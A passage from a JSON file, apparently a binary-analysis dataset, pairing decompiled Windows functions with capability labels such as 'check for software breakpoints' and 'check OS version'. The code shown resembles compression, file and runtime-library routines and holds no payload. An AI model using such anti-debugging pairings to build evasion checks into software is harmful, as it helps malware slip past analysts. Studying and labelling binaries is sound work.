            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a6a0(uchar *arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_ch_00;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e688;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_34h = arg_18h;\n    var_30h = 0;\n    var_10h = uVar1;\n    if (arg_10h < 3) {\ncode_r0x0041a7e7:\n        arg_8h_00 = fcn.004155d0(arg_ch, arg_10h);\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        arg_ch_00 = fcn.0042ad20(arg_8h_00, arg_ch, arg_10h, uVar1);\n    }\n    else {\n        iVar2 = fcn.0042bc6b(arg_ch, 0x44727c, 3);\n        if (iVar2 != 0) goto code_r0x0041a7e7;\n        if ((arg_14h != 0) && (var_34h != 0)) {\n            fcn.0042a6e0(&var_74h, 0, 0x40);\n            var_6ch = arg_ch + 3;\n            var_5ch = (arg_10h - 0x13) + var_6ch;\n            var_30h = arg_10h - 0x1f;\n            var_74h = 0x40;\n            var_70h = 1;\n            var_68h = 0xc;\n            var_58h = 0x10;\n            iVar2 = (**0x462fe0)(0x40, var_30h);\n            if (iVar2 != 0) {\n                iVar3 = (**0x463080)(var_34h, var_68h + var_6ch, var_30h, &var_74h, 0, 0, iVar2, var_30h, &var_30h, 0);\n                if (-1 < iVar3) {\n                    fcn.00419890(iVar2, var_30h);\n                    var_4h = 0;\n                    fcn.00406460(&var_2ch);\n                    fcn.00405d10();\n                    goto code_r0x0041a813;\n                }\n            }\n            fcn.004063a0(0x446e90);\n            goto code_r0x0041a813;\n        }\n        *(arg_8h + 0x14) = 0xf;\n        *(arg_8h + 0x10) = 0;\n        *arg_8h = 0;\n        arg_ch_00 = fcn.0042ad20(0x446e90);\n        arg_8h_00 = 0x446e90;\n    }\n    fcn.004062a0(arg_8h_00, arg_ch_00);\ncode_r0x0041a813:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 934
    },
    "00427150": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427150(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    if ((((*(in_ECX + 4) != 0) || (*(in_ECX + 0xc) != 0)) || (*(in_ECX + 0x20) != 0)) ||\n       (((*(in_ECX + 0x18) != 0 || (*(in_ECX + 0x14) != 0)) || (*(in_ECX + 0x2c) != '\\0')))) {\n        return 0x1000000;\n    }\n    if (arg_10h == 1) {\n        *(in_ECX + 4) = arg_8h;\n        *(in_ECX + 8) = 0;\n        uVar1 = (**0x462ee8)(arg_8h, 0, 0, 1);\n        *(in_ECX + 0x1c) = uVar1 != 0xffffffff;\n        *(in_ECX + 0x10) = -(uVar1 != 0xffffffff) & uVar1;\n        return 0;\n    }\n    if (arg_10h == 2) {\n        iVar2 = (**0x462ecc)(arg_8h, 0x40000000, 0, 0, 2, 0x80, 0);\n        *(in_ECX + 4) = iVar2;\n        if (iVar2 == -1) {\n            *(in_ECX + 4) = 0;\n            return 0x200;\n        }\n        *(in_ECX + 0x10) = 0;\n        *(in_ECX + 0x1c) = 1;\n        *(in_ECX + 8) = 1;\n        return 0;\n    }\n    if (arg_10h != 3) {\n        return 0x10000;\n    }\n    if (arg_ch == 0) {\n        return 0x30000;\n    }\n    if (arg_8h != 0) {\n        *(in_ECX + 0x20) = arg_8h;\ncode_r0x00427231:\n        *(in_ECX + 0x28) = arg_ch;\n        *(in_ECX + 0x24) = 0;\n        *(in_ECX + 0x1c) = 1;\n        return 0;\n    }\n    iVar2 = (**0x462ebc)(0xffffffff, 0, 4, 0, arg_ch, 0);\n    *(in_ECX + 0xc) = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (**0x463034)(iVar2, 0xf001f, 0, 0, arg_ch);\n        *(in_ECX + 0x20) = iVar2;\n        if (iVar2 != 0) goto code_r0x00427231;\n        (**0x462ed0)(*(in_ECX + 0xc));\n        *(in_ECX + 0xc) = 0;\n    }\n    return 0x300;\n}\n",
        "token_count": 715
    },
    "00427df0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427df0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    fcn.00425af0(arg_8h, arg_8h + 0x14, *(arg_8h + 0xfa8));\n    fcn.00425af0(arg_8h, arg_8h + 0x908, *(arg_8h + 0xfc4));\n    fcn.00427a90(arg_8h, arg_8h + 0xfc8);\n    iVar1 = 0x12;\n    do {\n        if (*(arg_8h + 0xef6 + *(iVar1 + 0x448124) * 4) != 0) {\ncode_r0x00427ebe:\n            *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + iVar1 * 3 + 0x11;\n            return;\n        }\n        if (*(arg_8h + 0xef6 + *(iVar1 + 0x448123) * 4) != 0) {\n            *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + (iVar1 + -1) * 3 + 0x11;\n            return;\n        }\n        if (*(arg_8h + 0xef6 + *(iVar1 + 0x448122) * 4) != 0) {\n            *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + (iVar1 + -2) * 3 + 0x11;\n            return;\n        }\n        if (*(arg_8h + 0xef6 + *(iVar1 + 0x448121) * 4) != 0) {\n            iVar1 = iVar1 + -3;\n            goto code_r0x00427ebe;\n        }\n        iVar1 = iVar1 + -4;\n        if (iVar1 < 3) {\n            *(arg_8h + 0x1af3c) = *(arg_8h + 0x1af3c) + iVar1 * 3 + 0x11;\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 516
    },
    "00428980": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428980(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    int32_t arg_ch;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    arg_8h_00 = arg_8h;\n    iVar3 = 0;\n    uVar4 = 0;\n    *(arg_8h + 0x6af80) = 2;\n    iVar1 = *(arg_8h + 0x6af90);\n    while (iVar1 != 0) {\n        if (2 < *(arg_8h_00 + 0x6af90)) {\n            uVar2 = (*(*(arg_8h_00 + 0x6af84) + 0x1af72 + arg_8h_00) ^ *(arg_8h_00 + 0x6af7c) << 5) & 0x7fff;\n            *(arg_8h_00 + 0x6af7c) = uVar2;\n            iVar3 = *(arg_8h_00 + 0x4af70 + uVar2 * 4);\n            *(arg_8h_00 + 0x2af70 + (*(arg_8h_00 + 0x6af84) & 0x7fff) * 4) = iVar3;\n            *(arg_8h_00 + 0x4af70 + *(arg_8h_00 + 0x6af7c) * 4) = *(arg_8h_00 + 0x6af84);\n        }\n        if ((iVar3 != 0) && (*(arg_8h_00 + 0x6af84) - iVar3 < 0x7efb)) {\n            uVar4 = *(arg_8h_00 + 0x6af90);\n            if (uVar4 <= *(arg_8h_00 + 0x6afa0) && *(arg_8h_00 + 0x6afa0) != uVar4) {\n                *(arg_8h_00 + 0x6afa0) = uVar4;\n            }\n            uVar4 = fcn.00426100(arg_8h_00, iVar3);\n            if (*(arg_8h_00 + 0x6af90) < uVar4) {\n                uVar4 = *(arg_8h_00 + 0x6af90);\n            }\n        }\n        if (uVar4 < 3) {\n            arg_8h = fcn.00425bd0(arg_8h_00, 0, *(*(arg_8h_00 + 0x6af84) + 0x1af70 + arg_8h_00));\n            *(arg_8h_00 + 0x6af90) = *(arg_8h_00 + 0x6af90) + -1;\n            *(arg_8h_00 + 0x6af84) = *(arg_8h_00 + 0x6af84) + 1;\n        }\n        else {\n            arg_8h = fcn.00425bd0(arg_8h_00, *(arg_8h_00 + 0x6af84) - *(arg_8h_00 + 0x6af88), uVar4 - 3);\n            *(arg_8h_00 + 0x6af90) = *(arg_8h_00 + 0x6af90) - uVar4;\n            if ((uVar4 < *(arg_8h_00 + 0x6af98) || uVar4 == *(arg_8h_00 + 0x6af98)) && (2 < *(arg_8h_00 + 0x6af90))) {\n                uVar4 = uVar4 - 1;\n                do {\n                    *(arg_8h_00 + 0x6af84) = *(arg_8h_00 + 0x6af84) + 1;\n                    uVar2 = (*(arg_8h_00 + 0x1af72 + *(arg_8h_00 + 0x6af84)) ^ *(arg_8h_00 + 0x6af7c) << 5) & 0x7fff;\n                    *(arg_8h_00 + 0x6af7c) = uVar2;\n                    iVar3 = *(arg_8h_00 + 0x4af70 + uVar2 * 4);\n                    uVar4 = uVar4 - 1;\n                    *(arg_8h_00 + 0x2af70 + (*(arg_8h_00 + 0x6af84) & 0x7fff) * 4) = iVar3;\n                    *(arg_8h_00 + 0x4af70 + *(arg_8h_00 + 0x6af7c) * 4) = *(arg_8h_00 + 0x6af84);\n                } while (uVar4 != 0);\n                *(arg_8h_00 + 0x6af84) = *(arg_8h_00 + 0x6af84) + 1;\n            }\n            else {\n                *(arg_8h_00 + 0x6af84) = *(arg_8h_00 + 0x6af84) + uVar4;\n                uVar2 = *(*(arg_8h_00 + 0x6af84) + 0x1af70 + arg_8h_00);\n                *(arg_8h_00 + 0x6af7c) = uVar2;\n                uVar4 = 0;\n                *(arg_8h_00 + 0x6af7c) = *(*(arg_8h_00 + 0x6af84) + 0x1af71 + arg_8h_00) ^ uVar2 << 5;\n            }\n        }\n        if (arg_8h != 0) {\n            iVar1 = *(arg_8h_00 + 0x6af74);\n            if (iVar1 < 0) {\n                arg_ch = 0;\n            }\n            else {\n                arg_ch = iVar1 + 0x1af70 + arg_8h_00;\n            }\n            fcn.004287f0(arg_8h_00, arg_ch, *(arg_8h_00 + 0x6af84) - iVar1, 0);\n            *(arg_8h_00 + 0x6af74) = *(arg_8h_00 + 0x6af84);\n        }\n        if (*(arg_8h_00 + 0x6af90) < 0x106) {\n            fcn.00426260(arg_8h_00);\n        }\n        iVar1 = *(arg_8h_00 + 0x6af90);\n    }\n    iVar1 = *(arg_8h_00 + 0x6af74);\n    if (iVar1 < 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = iVar1 + 0x1af70 + arg_8h_00;\n    }\n    fcn.004287f0(arg_8h_00, iVar3, *(arg_8h_00 + 0x6af84) - iVar1, 1);\n    return;\n}\n",
        "token_count": 1672
    },
    "00428bd0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428bd0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    bool bVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    bVar3 = false;\n    uVar7 = 2;\n    if (3 < *(arg_8h + 4)) {\n        if (*(arg_8h + 0x6af90) != 0) {\n            do {\n                if (2 < *(arg_8h + 0x6af90)) {\n                    uVar4 = (*(*(arg_8h + 0x6af84) + 0x1af72 + arg_8h) ^ *(arg_8h + 0x6af7c) << 5) & 0x7fff;\n                    *(arg_8h + 0x6af7c) = uVar4;\n                    var_8h = *(arg_8h + 0x4af70 + uVar4 * 4);\n                    *(arg_8h + 0x2af70 + (*(arg_8h + 0x6af84) & 0x7fff) * 4) = var_8h;\n                    *(arg_8h + 0x4af70 + *(arg_8h + 0x6af7c) * 4) = *(arg_8h + 0x6af84);\n                }\n                iVar5 = *(arg_8h + 0x6af88);\n                *(arg_8h + 0x6af80) = uVar7;\n                uVar7 = 2;\n                if (((var_8h != 0) && (*(arg_8h + 0x6af80) < *(arg_8h + 0x6af98))) &&\n                   (*(arg_8h + 0x6af84) - var_8h < 0x7efb)) {\n                    uVar7 = *(arg_8h + 0x6af90);\n                    if (uVar7 <= *(arg_8h + 0x6afa0) && *(arg_8h + 0x6afa0) != uVar7) {\n                        *(arg_8h + 0x6afa0) = uVar7;\n                    }\n                    uVar7 = fcn.00426100(arg_8h, var_8h);\n                    if (*(arg_8h + 0x6af90) < uVar7) {\n                        uVar7 = *(arg_8h + 0x6af90);\n                    }\n                    if ((uVar7 == 3) && (0x1000 < *(arg_8h + 0x6af84) - *(arg_8h + 0x6af88))) {\n                        uVar7 = 2;\n                    }\n                }\n                uVar4 = *(arg_8h + 0x6af80);\n                if ((uVar4 < 3) || (uVar4 < uVar7)) {\n                    if (bVar3) {\n                        iVar5 = fcn.00425bd0(arg_8h, 0, *(*(arg_8h + 0x6af84) + 0x1af6f + arg_8h));\n                        if (iVar5 != 0) {\n                            iVar5 = *(arg_8h + 0x6af74);\n                            if (iVar5 < 0) {\n                                iVar6 = 0;\n                            }\n                            else {\n                                iVar6 = iVar5 + 0x1af70 + arg_8h;\n                            }\n                            fcn.004287f0(arg_8h, iVar6, *(arg_8h + 0x6af84) - iVar5, 0);\n                            *(arg_8h + 0x6af74) = *(arg_8h + 0x6af84);\n                        }\n                        *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + 1;\n                    }\n                    else {\n                        *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + 1;\n                        bVar3 = true;\n                    }\n                    *(arg_8h + 0x6af90) = *(arg_8h + 0x6af90) + -1;\n                }\n                else {\n                    iVar6 = *(arg_8h + 0x6af84);\n                    iVar2 = *(arg_8h + 0x6af90);\n                    iVar5 = fcn.00425bd0(arg_8h, (iVar6 - iVar5) + -1, uVar4 - 3);\n                    *(arg_8h + 0x6af90) = *(arg_8h + 0x6af90) + (1 - *(arg_8h + 0x6af80));\n                    *(arg_8h + 0x6af80) = *(arg_8h + 0x6af80) + -2;\n                    do {\n                        *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + 1;\n                        uVar7 = *(arg_8h + 0x6af84);\n                        if (uVar7 <= iVar6 + -3 + iVar2) {\n                            uVar4 = (*(uVar7 + 0x1af72 + arg_8h) ^ *(arg_8h + 0x6af7c) << 5) & 0x7fff;\n                            *(arg_8h + 0x6af7c) = uVar4;\n                            var_8h = *(arg_8h + 0x4af70 + uVar4 * 4);\n                            *(arg_8h + 0x2af70 + (uVar7 & 0x7fff) * 4) = var_8h;\n                            *(arg_8h + 0x4af70 + *(arg_8h + 0x6af7c) * 4) = *(arg_8h + 0x6af84);\n                        }\n                        piVar1 = arg_8h + 0x6af80;\n                        *piVar1 = *piVar1 + -1;\n                    } while (*piVar1 != 0);\n                    *(arg_8h + 0x6af84) = *(arg_8h + 0x6af84) + 1;\n                    bVar3 = false;\n                    uVar7 = 2;\n                    if (iVar5 != 0) {\n                        iVar5 = *(arg_8h + 0x6af74);\n                        if (iVar5 < 0) {\n                            iVar6 = 0;\n                        }\n                        else {\n                            iVar6 = iVar5 + 0x1af70 + arg_8h;\n                        }\n                        fcn.004287f0(arg_8h, iVar6, *(arg_8h + 0x6af84) - iVar5, 0);\n                        *(arg_8h + 0x6af74) = *(arg_8h + 0x6af84);\n                    }\n                }\n                if (*(arg_8h + 0x6af90) < 0x106) {\n                    fcn.00426260(arg_8h);\n                }\n            } while (*(arg_8h + 0x6af90) != 0);\n            if (bVar3) {\n                fcn.00425bd0(arg_8h, 0, *(*(arg_8h + 0x6af84) + 0x1af6f + arg_8h));\n            }\n        }\n        iVar5 = *(arg_8h + 0x6af74);\n        if (iVar5 < 0) {\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = iVar5 + 0x1af70 + arg_8h;\n        }\n        fcn.004287f0(arg_8h, iVar6, *(arg_8h + 0x6af84) - iVar5, 1);\n        return;\n    }\n    fcn.00428980(arg_8h);\n    return;\n}\n",
        "token_count": 1869
    },
    "0043053f": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043053f(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.0042b6af(*(unaff_EBP + -0x28));\n    iVar1 = fcn.004328a1();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.004328a1();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0042b688(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.004302c6(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "0043bead": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0043bead(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4517d0;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4517cc + -1;\n        iVar14 = *0x4517cc + (*0x4517cc >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x4517cc & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0043bff1;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0043bff8;\ncode_r0x0043bff1:\n                        do {\n                            bVar6 = true;\ncode_r0x0043bff8:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0043c006;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0043c006:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4517c8 - *0x4517cc) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4517c8 < iVar14) {\n                if (iVar14 < *0x4517c4) {\n                    iVar14 = iVar14 + *0x4517d8;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4517d0 + (*0x4517d0 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4517d0 + (*0x4517d0 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x4517d8 + *0x4517c4;\n                }\n                goto code_r0x0043c3b1;\n            }\n            iVar13 = *0x4517c8 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4517cc + -1;\n            iVar13 = *0x4517cc + (*0x4517cc >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4517cc & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0043c1a5;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0043c1a5:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4517d0 + 1 + (*0x4517d0 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0043c3b1:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4517d4 == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4517d4 == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.0042a75a(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3256
    },
    "0043c3fe": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0043c3fe(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4517e8;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4517e4 + -1;\n        iVar14 = *0x4517e4 + (*0x4517e4 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - 